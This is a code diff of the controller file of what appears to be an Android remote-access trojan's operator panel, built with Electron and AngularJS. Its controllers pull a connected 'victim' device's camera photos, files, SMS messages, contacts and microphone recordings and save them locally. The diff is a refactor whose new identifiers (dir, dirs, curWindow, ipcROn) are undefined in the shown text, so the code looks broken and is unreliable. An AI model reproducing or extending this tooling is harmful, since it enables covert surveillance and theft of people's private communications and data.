@@ -1,16 +1,10 @@
-const { remote } = require('electron');
-const { ipcRenderer } = require('electron');
 var app = angular.module('myappy', ['ngRoute', 'infinite-scroll']);
-var fs = require("fs-extra");
-const CONSTANTS = require(__dirname + '/assets/js/Constants')
 var ORDER = CONSTANTS.order;
-var socket = remote.getCurrentWebContents().victim;
-var homedir = require('node-homedir');
-var path = require("path");
+var dataPath = dir.join(dirs.homedir(), CONSTANTS.dataDir);
+var downloadsPath = dir.join(dataPath, CONSTANTS.downloadPath);
+var outputPath = dir.join(dataPath, CONSTANTS.outputApkPath);
 
-var dataPath = path.join(homedir(), CONSTANTS.dataDir);
-var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
-var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);
+
 
 //-----------------------Routing Config------------------------
 app.config(function ($routeProvider) {
@@ -57,16 +51,16 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location) {
     var log = document.getElementById("logy");
     $labCtrl.logs = [];
 
-    const window = remote.getCurrentWindow();
+
     $labCtrl.close = () => {
-        window.close();
+        curWindow.close();
     };
 
     $labCtrl.maximize = () => {
-        if (window.isMaximized()) {
-            window.unmaximize(); // Restore the window size
+        if (curWindow.isMaximized()) {
+            curWindow.unmaximize(); // Restore the window size
         } else {
-            window.maximize(); // Maximize the window
+            curWindow.maximize(); // Maximize the window
         }
     };
 
@@ -96,14 +90,14 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location) {
 
     //fired when notified from Main Proccess (main.js) about
     // this victim who disconnected
-    ipcRenderer.on('SocketIO:VictimDisconnected', (event) => {
+    ipcRenderer.ipcROn('SocketIO:VictimDisconnected', (event) => {
         $rootScope.Log('Victim Disconnected', CONSTANTS.logStatus.FAIL);
     });
 
 
     //fired when notified from the Main Process (main.js) about
     // the Server disconnection
-    ipcRenderer.on('SocketIO:ServerDisconnected', (event) => {
+    ipcRenderer.ipcROn('SocketIO:ServerDisconnected', (event) => {
         $rootScope.Log('[¡] Server Disconnected', CONSTANTS.logStatus.INFO);
     });
 
@@ -173,7 +167,7 @@ app.controller("CamCtrl", function ($scope, $rootScope) {
 
             $camCtrl.savePhoto = () => {
                 $rootScope.Log('Saving picture..');
-                var picPath = path.join(downloadsPath, Date.now() + ".jpg");
+                var picPath = dir.join(downloadsPath, Date.now() + ".jpg");
                 fs.outputFile(picPath, new Buffer(base64String, "base64"), (err) => {
                     if (!err)
                         $rootScope.Log('Picture saved on ' + picPath, CONSTANTS.logStatus.SUCCESS);
@@ -234,7 +228,7 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
     socket.on(fileManager, (data) => {
         if (data.file == true) { // response with file's binary
             $rootScope.Log('Saving file..');
-            var filePath = path.join(downloadsPath, data.name);
+            var filePath = dir.join(downloadsPath, data.name);
 
             // function to save the file to my local disk
             fs.outputFile(filePath, data.buffer, (err) => {
@@ -328,7 +322,7 @@ app.controller("SMSCtrl", function ($scope, $rootScope) {
         }
 
         var csvStr = csvRows.join("\n");
-        var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
+        var csvPath = dir.join(downloadsPath, "SMS_" + Date.now() + ".csv");
         $rootScope.Log("Saving SMS List...");
         fs.outputFile(csvPath, csvStr, (error) => {
             if (error)
@@ -467,7 +461,7 @@ app.controller("ContCtrl", function ($scope, $rootScope) {
         }
 
         var csvStr = csvRows.join("\n");
-        var csvPath = path.join(downloadsPath, "Contacts_" + Date.now() + ".csv");
+        var csvPath = dir.join(downloadsPath, "Contacts_" + Date.now() + ".csv");
         $rootScope.Log("Saving Contacts List...");
         fs.outputFile(csvPath, csvStr, (error) => {
             if (error)
@@ -545,7 +539,7 @@ app.controller("MicCtrl", function ($scope, $rootScope) {
 
             $MicCtrl.SaveAudio = () => {
                 $rootScope.Log('Saving file..');
-                var filePath = path.join(downloadsPath, data.name);
+                var filePath = dir.join(downloadsPath, data.name);
                 fs.outputFile(filePath, data.buffer, (err) => {
                     if (err)
                         $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
